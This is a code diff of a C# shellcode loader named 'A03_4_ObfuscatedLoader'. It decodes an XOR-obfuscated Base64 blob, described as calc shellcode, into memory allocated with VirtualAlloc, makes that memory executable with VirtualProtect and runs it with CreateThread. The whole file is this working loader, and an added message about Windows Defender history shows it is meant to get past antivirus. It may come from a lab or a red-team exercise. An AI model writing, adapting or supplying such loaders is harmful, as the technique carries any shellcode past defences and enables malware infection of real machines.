@@ -1,13 +1,10 @@
 using System;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
 
 namespace A03_4_ObfuscatedLoader
 {
     class Program
     {
-        // --- P/Invoke Signatures ---
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
 
@@ -20,48 +17,48 @@ namespace A03_4_ObfuscatedLoader
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
-        // --- Constants ---
         const uint MEM_COMMIT = 0x1000;
         const uint MEM_RESERVE = 0x2000;
         const uint PAGE_READWRITE = 0x04;
         const uint PAGE_EXECUTE_READ = 0x20;
         const uint INFINITE = 0xFFFFFFFF;
 
-        static byte[] XorTransform(byte[] data, byte key)
-        {
-            byte[] output = new byte[data.Length];
-            for (int i = 0; i < data.Length; i++) { output[i] = (byte)(data[i] ^ key); }
-            return output;
-        }
-
         static void Main(string[] args)
         {
-            byte xorKey = 0x5A;
-            // This is the Base64 representation of your x64 calc shellcode XOR'd with 0x5A
+            // 1. The Obfuscated Data (XOR 0x5A)
+            // This string represents the exact 138 bytes of the calc shellcode.
             string embeddedBlob = "SINK7CgoSDE99mXoSL92GBhIvzAwSDE2SDE2SDEuEIs9PChIAeiLgIgAAABIAnrkRIuYGBRIu2ggSUEB7USLeCRIUQHtRIt4HBRIAe1I/+xD9zylBaU0IiwSHeEBIAnowSAdIAnrwSAnIEAABIAnoski9mXoRUi7amNhbGMuZXhlUkiJ4boBAAAAf9BIg8REOMM=";
 
             byte[] encoded = Convert.FromBase64String(embeddedBlob);
-            byte[] decoded = XorTransform(encoded, xorKey);
+            byte[] decoded = new byte[encoded.Length];
 
-            // 1. Allocate buffer (Read/Write)
+            // Inline XOR for simplicity
+            for (int i = 0; i < encoded.Length; i++)
+            {
+                decoded[i] = (byte)(encoded[i] ^ 0x5A);
+            }
+
+            Console.WriteLine("[*] Target Architecture: x64");
+            Console.WriteLine("[*] Payload Size: {0} bytes", decoded.Length);
+
+            // 2. Allocate
             IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)decoded.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (mem == IntPtr.Zero) return;
 
-            // 2. Copy the decoded shellcode to memory
+            // 3. Copy
             Marshal.Copy(decoded, 0, mem, decoded.Length);
-            Console.WriteLine("[*] Payload de-obfuscated and staged.");
 
-            // 3. Change protection to Execute/Read (Critical for DEP)
+            // 4. Flip Permissions
             uint oldProtect;
             VirtualProtect(mem, (UIntPtr)decoded.Length, PAGE_EXECUTE_READ, out oldProtect);
-            Console.WriteLine("[*] Memory protection set to Execute.");
 
-            // 4. Execute the thread at the 'mem' location
-            uint threadId;
-            IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out threadId);
+            // 5. Launch
+            Console.WriteLine("[*] Launching thread at 0x{0:X}...", mem.ToInt64());
+            IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out uint threadId);
 
             if (hThread != IntPtr.Zero)
             {
-                Console.WriteLine("[*] Shellcode thread launched. Waiting...");
+                Console.WriteLine("[*] Successfully started. If no calc appears, check Windows Defender history.");
                 WaitForSingleObject(hThread, INFINITE);
             }
         }
